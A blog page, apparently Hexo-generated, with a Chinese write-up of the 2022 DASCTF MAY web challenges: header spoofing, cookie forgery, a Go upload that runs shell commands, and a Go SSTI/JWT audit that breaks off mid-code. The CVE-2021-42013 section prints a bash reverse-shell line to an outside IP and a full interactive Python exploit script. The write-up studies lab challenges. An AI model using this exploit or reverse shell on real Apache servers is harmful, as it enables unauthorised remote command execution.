@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>2022DASCTF MAY 出题人挑战赛(web)复现 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2022DASCTF MAY 出题人挑战赛(web)复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 24, 2025&nbsp;&nbsp;9:53:19</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="2022DASCTF-MAY-出题人挑战赛-web-复现"><a href="#2022DASCTF-MAY-出题人挑战赛-web-复现" class="headerlink" title="2022DASCTF MAY 出题人挑战赛(web)复现"></a>2022DASCTF MAY 出题人挑战赛(web)复现</h1><p>题目复现</p>
+<h2 id="魔法浏览器"><a href="#魔法浏览器" class="headerlink" title="魔法浏览器"></a>魔法浏览器</h2><p>打开题目</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/aebc96afce47464b.png" alt="aebc96afce47464b.png"></p>
+<p>源码中发现</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/55319a8e97289057.png" alt="55319a8e97289057.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>复制到控制台</p>
+<p>出现</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/0e8cc1d84df60f3e.png" alt="0e8cc1d84df60f3e.png"></p>
+<p>复制</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Mozilla</span>/<span class="number">5.0</span> (<span class="title class_">Windows</span> <span class="variable constant_">NT</span> <span class="number">10.0</span>; <span class="title class_">Win64</span>; x64) <span class="title class_">AppleWebKit</span>/<span class="number">537.36</span> (<span class="variable constant_">KHTML</span>, like <span class="title class_">Gecko</span>) <span class="title class_">Magic</span>/<span class="number">100.0</span><span class="number">.4896</span><span class="number">.75</span></span><br></pre></td></tr></table></figure>
+
+<p>UA头传参</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/4a1850221a26b430.png" alt="4a1850221a26b430.png"></p>
+<p>得到flag</p>
+<h2 id="Power-Cookie"><a href="#Power-Cookie" class="headerlink" title="Power Cookie"></a>Power Cookie</h2><p>题目知识点（Cookie 伪造）</p>
+<p>打开题目开始看题</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/a8e1468de14d58b2.png" alt="a8e1468de14d58b2.png"></p>
+<p>点击按钮</p>
+<p>进入新页面</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/6827359f668bb310.png" alt="6827359f668bb310.png"></p>
+<p>发现cookie的值：admin:0（猜测现在是普通用户）</p>
+<p>我们试试改成<code>admin=1</code> （admin用户）</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/5c28920bb7c85777.png" alt="5c28920bb7c85777.png"></p>
+<p>得到flag</p>
+<h2 id="getme"><a href="#getme" class="headerlink" title="getme"></a>getme</h2><p>题目知识：cve 漏洞 CVE-2021-42013 ，路径遍历漏洞将允许任意命令执行</p>
+<p>打开题目看看题</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/ee0195264a1c8d7b.png" alt="ee0195264a1c8d7b.png"></p>
+<p>查看源码看看</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/f3a31d3fd9a992cd.png" alt="f3a31d3fd9a992cd.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  <span class="attr">pwd</span>:<span class="regexp">/usr/</span>local/apache2/ --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们抓包看看响应头（我不知道为什么我抓不到这个包只能用别人的图啦hhh）</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/6731d759a25893b9.png" alt="6731d759a25893b9.png"></p>
+<p>后面抓包看到响应头</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/b5aca722aa657c78.png" alt="b5aca722aa657c78.png"></p>
+<p>使用插件也可以看</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/4dfe99325193a2cf.png" alt="4dfe99325193a2cf.png"></p>
+<p>得知是是 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/RichardYg/p/16272796.html">Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br><span class="line">echo;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/106.52.251.181/1337 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们这里构造python 脚本来（因为bp 总是回显400）</p>
+<p>于是这里我做了个（调教ai得出的）交互式的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址（你提供的 CTF 靶机地址）</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://node5.buuoj.cn:27800/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞路径列表（路径穿越）</span></span><br><span class="line">PAYLOADS = [</span><br><span class="line">    <span class="string">&quot;/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">base_url, path, cmd</span>):</span><br><span class="line">    parsed = urlparse(base_url)</span><br><span class="line">    host = parsed.hostname</span><br><span class="line">    port = parsed.port <span class="keyword">or</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = http.client.HTTPConnection(host, port, timeout=<span class="number">5</span>)</span><br><span class="line">        payload = <span class="string">f&quot;echo Content-Type: text/plain; echo; <span class="subst">&#123;cmd&#125;</span>\n&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        conn.request(<span class="string">&quot;POST&quot;</span>, path, body=payload, headers=headers)</span><br><span class="line">        response = conn.getresponse()</span><br><span class="line">        result = response.read().decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status, result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 测试目标: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试找到可利用路径</span></span><br><span class="line">    working_path = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> PAYLOADS:</span><br><span class="line">        status, output = send_cmd(BASE_URL, path, <span class="string">&quot;id&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;uid=&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">            working_path = path</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到可利用路径: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> working_path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现可用漏洞路径，退出&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 命令执行交互</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;shell&gt; &quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> cmd <span class="keyword">in</span> [<span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> cmd:</span><br><span class="line">            status, output = send_cmd(BASE_URL, working_path, cmd)</span><br><span class="line">            <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(output.strip())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求失败: <span class="subst">&#123;status&#125;</span> - <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行之后输入命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/5f6a96798c1a002d.png" alt="5f6a96798c1a002d.png"></p>
+<p>出现flag</p>
+<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>打开题目开始看题</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/58863e3014c19b7e.png" alt="58863e3014c19b7e.png"></p>
+<p>点击下方的GOTOLIST进入新页面</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/190eca602b7c9b20.png" alt="190eca602b7c9b20.png"></p>
+<p>上面的都查看了 ，flag里面是假的flag</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/8eb62343204a296d.png" alt="8eb62343204a296d.png"></p>
+<p>点击users会去跳转</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/8773381a9a4568ae.png" alt="8773381a9a4568ae.png"></p>
+<p>没users.go就上传一个users.go</p>
+<p>接下来访问Upload.gofile 按钮（多次点击）</p>
+<p>准备上传文件</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/7e76d06fc1e3d9cc.png" alt="7e76d06fc1e3d9cc.png"></p>
+<p>users.go文件内容</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> ShellToUse = <span class="string">&quot;bash&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Shellout</span><span class="params">(command <span class="type">string</span>)</span></span> (<span class="type">error</span>, <span class="type">string</span>, <span class="type">string</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> stdout bytes.Buffer</span><br><span class="line"><span class="keyword">var</span> stderr bytes.Buffer</span><br><span class="line">cmd := exec.Command(ShellToUse, <span class="string">&quot;-c&quot;</span>, command)</span><br><span class="line">cmd.Stdout = &amp;stdout</span><br><span class="line">cmd.Stderr = &amp;stderr</span><br><span class="line">err := cmd.Run()</span><br><span class="line"><span class="keyword">return</span> err, stdout.String(), stderr.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">err, out, errout := Shellout(<span class="string">&quot;tac /f*&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;error: %v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;--- stdout ---&quot;</span>)</span><br><span class="line">fmt.Println(out)</span><br><span class="line">fmt.Println(<span class="string">&quot;--- stderr ---&quot;</span>)</span><br><span class="line">fmt.Println(errout)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后我们访问users</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/e844190ce2ac2ffa.png" alt="e844190ce2ac2ffa.png"></p>
+<p>得到flag</p>
+<h2 id="fxxkgo"><a href="#fxxkgo" class="headerlink" title="fxxkgo"></a>fxxkgo</h2><p>开题前的概述： 前面已经复现了一道go（[LineCTF2022]gotm）题，看看这道题分析分析复现看看</p>
+<p>（go ssti + jwt伪造）</p>
+<p>复现平台：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[2022DASCTF%20MAY%20%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B]fxxkgo">BUUCTF</a></p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/6fd5dd7381fead04.png" alt="6fd5dd7381fead04.png"></p>
+<p>下载好附件后，我们开始代码审计</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/2cba43e21a64b161.png" alt="2cba43e21a64b161.png"></p>
+<p>有这些文件 .idea 里面是一些配置文件，Dockerfile 是部署文件，go.mod 和go sum 是项目依赖文件 </p>
+<p>我们主要是看main.go</p>
+<h3 id="go代码审计"><a href="#go代码审计" class="headerlink" title="go代码审计"></a>go代码审计</h3><p>main.go内容</p>
+<h4 id="功能模块分析"><a href="#功能模块分析" class="headerlink" title="功能模块分析"></a>功能模块分析</h4><p>这段 Go 代码的作用是导入声明表明</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/golang-jwt/jwt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;text/template&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Account <span class="keyword">struct</span> &#123;</span><br><span class="line">	id         <span class="type">string</span></span><br><span class="line">	pw         <span class="type">string</span></span><br><span class="line">	is_admin   <span class="type">bool</span></span><br><span class="line">	secret_key <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>定义了 Account 结构体，有四个属性</p>
+<h3 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	admin := Account&#123;admin_id, admin_pw, <span class="literal">true</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, admin)</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>,index)</span><br><span class="line">	r.POST(<span class="string">&quot;/&quot;</span>, rootHandler)</span><br><span class="line">	r.POST(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">	r.POST(<span class="string">&quot;/auth&quot;</span>, authHandler)</span><br><span class="line">	r.POST(<span class="string">&quot;/register&quot;</span>, Resist)</span><br><span class="line">	r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据主函数我们可以得知它有<strong>5个路由</strong></p>
+<p>根目录的<code>GET</code>请求和<code>POST</code>请求进入的路由不相同，实现的功能也不同。这个题目其实就是按照路由走一遍然后就可以得到<code>lag</code>了，具体怎么走，看的懂<code>go语言</code>的兄弟可以思考一下，看不懂的我直接讲了，首先我们先去分析五个路由对应的函数实现了什么功能</p>
+<p>一个一个来分析</p>
+<h4 id="路由-GET"><a href="#路由-GET" class="headerlink" title="&#x2F;路由(GET)"></a>&#x2F;路由(GET)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.JSON(<span class="number">200</span>,gin.H&#123;</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Hello World&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>功能：进入之后输出json格式的信息</p>
+<h4 id="路由-POST"><a href="#路由-POST" class="headerlink" title="&#x2F;路由(POST)"></a>&#x2F;路由(POST)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	token := c.GetHeader(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(c.Writer, 